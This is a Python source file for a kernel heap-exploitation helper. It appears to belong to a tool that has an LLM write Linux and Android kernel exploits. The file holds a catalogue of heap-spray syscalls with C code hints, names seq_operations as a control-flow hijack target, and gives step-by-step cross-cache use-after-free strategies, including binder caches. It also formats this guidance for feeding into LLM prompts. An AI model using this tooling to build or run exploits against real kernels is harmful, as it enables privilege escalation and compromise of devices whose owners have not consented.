"""
analysis.slab_oracle — Slab cache knowledge base and spray strategy advisor.

Maps kernel objects → slab caches and recommends which userspace
operations spray into the same slab.  Critical for heap-spray-based
exploits where the LLM otherwise guesses blindly.

Data comes from three sources:
1. ``/proc/slabinfo`` collected from the target
2. pahole / BTF struct size data
3. Static knowledge base of common spray objects
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Tuple


# ── Static spray-object knowledge base ────────────────────────────────
# Maps well-known userspace operations to the kernel objects they allocate.

SPRAY_OBJECTS: Dict[str, Dict[str, Any]] = {
    # ─ Universal spray objects (work on most Linux / Android kernels) ─
    "sendmsg_cmsg": {
        "syscall": "sendmsg()",
        "alloc_sizes": [64, 128, 256, 512, 1024],
        "lifetime": "until sendmsg returns (short)",
        "notes": (
            "cmsg_control data, flexible size via padding. "
            "Use with socketpair(AF_UNIX, SOCK_DGRAM)."
        ),
        "code_hint": (
            "socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);\n"
            "struct msghdr msg = {.msg_control = buf, .msg_controllen = size};"
        ),
    },
    "msgsnd_msg_msg": {
        "syscall": "msgsnd()",
        "alloc_sizes": list(range(64, 4097, 8)),  # 48-byte header + data
        "lifetime": "until msgrcv (persistent)",
        "notes": (
            "msg_msg has 48-byte header; total alloc = 48 + user_data_size. "
            "Goes to kmalloc-N where N = next_power_of_2(48 + data_size)."
        ),
        "code_hint": "msgsnd(qid, &msg, data_size, 0);",
    },
    "readv_iovec": {
        "syscall": "readv()",
        "alloc_sizes": [192, 256, 384, 512, 768, 1024],
        "lifetime": "until readv completes (blocks if no data)",
        "notes": (
            "Kernel allocates struct iovec[] array. Block by reading "
            "from an empty pipe. Size = nr_segs * sizeof(struct iovec). "
            "sizeof(struct iovec) = 16 on 64-bit."
        ),
        "code_hint": (
            "struct iovec iovs[SPRAY_SIZE];\n"
            "readv(pipe_fd, iovs, SPRAY_SIZE);  /* blocks until data */"
        ),
    },
    "setxattr": {
        "syscall": "setxattr()",
        "alloc_sizes": list(range(1, 65537)),
        "lifetime": "freed on syscall return (very short)",
        "notes": (
            "Any kmalloc size. The allocation is short-lived — useful "
            "for cross-cache timing but not for long-lived sprays. "
            "Requires a file/dir with xattr support."
        ),
        "code_hint": 'setxattr("/tmp/x", "user.a", buf, size, 0);',
    },
    "add_key": {
        "syscall": "add_key()",
        "alloc_sizes": list(range(1, 32769)),
        "lifetime": "until keyctl(KEYCTL_REVOKE) (persistent)",
        "notes": (
            "Persistent allocation. Good for long-lived sprays. "
            "Limit: ~200 keys per user by default."
        ),
        "code_hint": (
            'syscall(__NR_add_key, "user", desc, payload, size, '
            "KEY_SPEC_PROCESS_KEYRING);"
        ),
    },
    "pipe_fcntl_resize": {
        "syscall": "fcntl(F_SETPIPE_SZ)",
        "alloc_sizes": ["page-aligned pipe_buffer arrays"],
        "lifetime": "until pipe close (persistent)",
        "notes": (
            "Resizing a pipe allocates a new pipe_buffer array. "
            "Each entry is 40 bytes. Going from N to M pages "
            "allocates M * sizeof(pipe_buffer) bytes."
        ),
        "code_hint": "fcntl(pipe_fd, F_SETPIPE_SZ, new_size);",
    },
    "pipe_write_pages": {
        "syscall": "write() to pipe",
        "alloc_sizes": ["page-sized (4096)"],
        "lifetime": "until read from pipe (persistent)",
        "notes": (
            "Each 4096-byte write allocates a physical page from the "
            "buddy allocator. Used for page-level cross-cache reclaim."
        ),
        "code_hint": "write(pipe_fd[1], page_buf, 4096);",
    },
    "epoll_ctl_add": {
        "syscall": "epoll_ctl(EPOLL_CTL_ADD)",
        "alloc_sizes": [128],
        "lifetime": "until epoll_ctl(DEL) or epoll fd close",
        "notes": (
            "Allocates struct epitem (~128 bytes). On some kernels "
            "this goes to a dedicated 'eventpoll_epi' cache, on others "
            "kmalloc-128."
        ),
        "code_hint": (
            "epoll_ctl(epfd, EPOLL_CTL_ADD, target_fd, &event);"
        ),
    },
    "timerfd_create": {
        "syscall": "timerfd_create()",
        "alloc_sizes": [256],
        "lifetime": "until close (persistent)",
        "notes": (
            "Allocates struct timerfd_ctx (~256 bytes). "
            "Goes to kmalloc-256 or dedicated cache."
        ),
        "code_hint": "timerfd_create(CLOCK_MONOTONIC, 0);",
    },
    "seq_operations_open": {
        "syscall": "open(/proc/self/stat) etc.",
        "alloc_sizes": [32],
        "lifetime": "until close",
        "notes": (
            "Opening certain /proc files allocates a seq_operations "
            "struct (32 bytes, kmalloc-32). Has function pointers — "
            "can be used for control-flow hijack."
        ),
        "code_hint": 'open("/proc/self/stat", O_RDONLY);',
    },
    "sk_buff_alloc": {
        "syscall": "sendto() on raw/udp socket",
        "alloc_sizes": list(range(256, 65537, 256)),
        "lifetime": "until packet processed (short)",
        "notes": (
            "Network packet allocation. Variable size controlled by "
            "packet payload length. Short-lived."
        ),
        "code_hint": "sendto(sock, buf, size, 0, &addr, sizeof(addr));",
    },
}

# ── Common struct → dedicated slab mappings ───────────────────────────

_DEDICATED_SLAB_MAP: Dict[str, str] = {
    "file": "filp",
    "inode": "inode_cache",
    "dentry": "dentry",
    "sock": "sock_inode_cache",
    "signal_struct": "signal_cache",
    "sighand_struct": "sighand_cache",
    "mm_struct": "mm_struct",
    "vm_area_struct": "vm_area_struct",
    "task_struct": "task_struct",
    "cred": "cred_jar",
    "pid": "pid",
    "files_struct": "files_cache",
    "fs_struct": "fs_cache",
    "nsproxy": "nsproxy",
    "binder_proc": "binder_proc",
    "binder_node": "binder_node",
    "binder_ref": "binder_ref",
    "binder_thread": "binder_thread",
    "binder_buffer": "binder_buffer",
}


class SlabOracle:
    """Slab cache knowledge base and spray strategy advisor.

    Answers the questions:
    - What slab cache does struct X live in?
    - What size is kmalloc-N for the target?
    - What userspace operations spray into cache Y?
    - What's a good cross-cache strategy for cache Y?
    """

    def __init__(
        self,
        slabinfo: str = "",
        struct_sizes: Optional[Dict[str, int]] = None,
    ) -> None:
        self._caches: Dict[str, Dict[str, Any]] = {}
        self._struct_sizes = struct_sizes or {}
        if slabinfo:
            self._parse_slabinfo(slabinfo)

    # ── Public API ────────────────────────────────────────────────────

    def get_cache_for_size(self, size: int) -> str:
        """Get the ``kmalloc-N`` cache for an allocation of *size* bytes."""
        buckets = [8, 16, 32, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096, 8192]
        for b in buckets:
            if size <= b:
                return f"kmalloc-{b}"
        return f"kmalloc-{size}"

    def get_cache_for_struct(self, struct_name: str) -> Optional[str]:
        """Get the slab cache for a given kernel struct.

        1. Check dedicated caches (filp, inode_cache, cred_jar, etc.)
        2. Fall back to kmalloc-N based on struct size from pahole
        """
        if struct_name in _DEDICATED_SLAB_MAP:
            cache_name = _DEDICATED_SLAB_MAP[struct_name]
            # Verify it exists in slabinfo if we have it
            if self._caches and cache_name in self._caches:
                return cache_name
            if not self._caches:
                return cache_name  # trust the static map

        # Fall back to size-based
        if struct_name in self._struct_sizes:
            return self.get_cache_for_size(self._struct_sizes[struct_name])
        return None

    def get_cache_info(self, cache_name: str) -> Optional[Dict[str, Any]]:
        """Get metadata for a cache from parsed slabinfo."""
        return self._caches.get(cache_name)

    def recommend_spray_objects(
        self,
        target_cache: str,
        *,
        prefer_persistent: bool = True,
    ) -> List[Dict[str, Any]]:
        """Recommend spray objects for the given target cache.

        Returns ranked list of {name, syscall, notes, code_hint}
        suitable for spraying into *target_cache*.

        For dedicated caches (e.g. ``binder_transaction``), recommends
        cross-cache spray objects based on the object size.
        """
        # Determine the target size range
        m = re.match(r"kmalloc-(\d+)", target_cache)
        target_size = int(m.group(1)) if m else None

        # For dedicated (non-kmalloc) caches, look up the object size
        # from slabinfo or use common known sizes for cross-cache recommendations
        is_dedicated = target_size is None
        if is_dedicated:
            # Try to get actual object size from slabinfo
            cache_info = self.get_cache_info(target_cache)
            if cache_info:
                obj_size = cache_info.get("objsize", 0)
                if obj_size:
                    # Find the corresponding kmalloc bucket for cross-cache
                    kmalloc_cache = self.get_cache_for_size(obj_size)
                    km = re.match(r"kmalloc-(\d+)", kmalloc_cache)
                    target_size = int(km.group(1)) if km else None

            # Also check known dedicated cache sizes
            if target_size is None:
                _KNOWN_CACHE_SIZES = {
                    "binder_transaction": 512,
                    "binder_proc": 1024,
                    "binder_node": 256,
                    "binder_ref": 128,
                    "binder_thread": 512,
                    "binder_buffer": 128,
                    "filp": 256,
                    "inode_cache": 1024,
                    "dentry": 192,
                    "cred_jar": 192,
                    "signal_cache": 1024,
                    "sighand_cache": 2048,
                    "mm_struct": 1024,
                    "vm_area_struct": 192,
                    "task_struct": 4096,
                    "pid": 128,
                    "files_cache": 768,
                    "fs_cache": 64,
                    "nsproxy": 64,
                    "sock_inode_cache": 1024,
                }
                if target_cache in _KNOWN_CACHE_SIZES:
                    size = _KNOWN_CACHE_SIZES[target_cache]
                    kmalloc_cache = self.get_cache_for_size(size)
                    km = re.match(r"kmalloc-(\d+)", kmalloc_cache)
                    target_size = int(km.group(1)) if km else None

        results: List[Tuple[int, Dict[str, Any]]] = []
        for name, info in SPRAY_OBJECTS.items():
            sizes = info["alloc_sizes"]
            if isinstance(sizes, list) and all(isinstance(s, int) for s in sizes):
                if target_size and target_size in sizes:
                    score = 10
                    # Prefer persistent sprays
                    if prefer_persistent and "persistent" in info["lifetime"]:
                        score += 5
                    results.append((score, {
                        "name": name,
                        "syscall": info["syscall"],
                        "lifetime": info["lifetime"],
                        "notes": info["notes"],
                        "code_hint": info["code_hint"],
                    }))
            elif "page" in str(sizes):
                # Page-level sprays are relevant for cross-cache
                # (both kmalloc and dedicated caches)
                results.append((1, {
                    "name": name,
                    "syscall": info["syscall"],
                    "lifetime": info["lifetime"],
                    "notes": info["notes"],
                    "code_hint": info["code_hint"],
                }))

        # For dedicated caches, annotate that these are cross-cache recommendations
        if is_dedicated and results:
            for _, obj in results:
                obj["notes"] = (
                    f"[CROSS-CACHE] {target_cache} is a dedicated slab cache. "
                    f"Same-slab spray is not possible — use cross-cache technique "
                    f"(free victim → free slab pages → reclaim with this object). "
                    + obj["notes"]
                )

        results.sort(key=lambda x: x[0], reverse=True)
        return [r[1] for r in results]

    def recommend_cross_cache_strategy(
        self,
        target_cache: str,
        target_size: int = 0,
    ) -> Dict[str, Any]:
        """Recommend a cross-cache attack strategy.

        Cross-cache pattern:
        1. Groom: fill the target slab with spray objects
        2. Trigger: free the victim object (UAF/double-free)
        3. Free: release spray objects → slab pages go to buddy allocator
        4. Reclaim: allocate from a different slab on same pages

        Returns a dict with strategy details and code hints.
        """
        m = re.match(r"kmalloc-(\d+)", target_cache)
        if m:
            tsize = int(m.group(1))
        else:
            tsize = target_size

        strategy: Dict[str, Any] = {
            "target_cache": target_cache,
            "target_size": tsize,
            "groom_objects": [],
            "reclaim_objects": [],
            "notes": [],
        }

        # Phase 1: Grooming — fill the target slab
        groom = self.recommend_spray_objects(target_cache)
        if groom:
            strategy["groom_objects"] = groom[:3]

        # Phase 2: Reclaim — page-level replacement
        # Pipe pages are the most common reclaim method (4/6 exploits)
        strategy["reclaim_objects"] = [
            {
                "name": "pipe_write_pages",
                "notes": (
                    "Write 4096-byte pages to pipes. The freed slab pages "
                    "return to the buddy allocator and get reclaimed by "
                    "pipe data page allocations. Verify with "
                    "ioctl(pipe_fd, FIONREAD) — if it returns garbage "
                    "(e.g., 0x41414141), the overlap succeeded."
                ),
                "code_hint": (
                    "char page_data[4096];\n"
                    "memset(page_data, 0x41, sizeof(page_data));\n"
                    "for (int i = 0; i < PIPE_SPRAY_COUNT; i++)\n"
                    "    write(spray_pipes[i][1], page_data, 4096);"
                ),
            }
        ]

        # Notes on the technique
        if tsize <= 256:
            strategy["notes"].append(
                f"Target is in a small slab (kmalloc-{tsize}). "
                f"You'll need many spray objects to fill slab pages. "
                f"Typical count: 1024-4096 objects."
            )
        elif tsize <= 1024:
            strategy["notes"].append(
                f"Target is in an medium slab (kmalloc-{tsize}). "
                f"Consider struct file (256 bytes) or ptmx write "
                f"buffers (1024 bytes) for same-slab reclaim."
            )

        strategy["notes"].append(
            "CPU pinning (sched_setaffinity to CPU 0) is critical — "
            "ensures all spray objects land in the same per-CPU slab."
        )

        return strategy

    def format_for_prompt(self) -> str:
        """Format spray recommendations for LLM prompt injection."""
        lines = ["=== Slab Spray Knowledge Base ==="]
        for name, info in sorted(SPRAY_OBJECTS.items()):
            sizes = info["alloc_sizes"]
            if isinstance(sizes, list) and len(sizes) > 10:
                size_str = f"{min(sizes)}-{max(sizes)}"
            else:
                size_str = str(sizes)
            lines.append(
                f"  {name}: {info['syscall']} — sizes={size_str}, "
                f"lifetime={info['lifetime']}"
            )
        return "\n".join(lines)

    # ── Private ───────────────────────────────────────────────────────

    def _parse_slabinfo(self, slabinfo: str) -> None:
        """Parse ``/proc/slabinfo`` text."""
        for line in slabinfo.splitlines():
            if line.startswith("#") or line.startswith("slabinfo"):
                continue
            parts = line.split()
            if len(parts) >= 4:
                name = parts[0]
                try:
                    self._caches[name] = {
                        "active_objs": int(parts[1]),
                        "num_objs": int(parts[2]),
                        "objsize": int(parts[3]),
                    }
                except (ValueError, IndexError):
                    continue
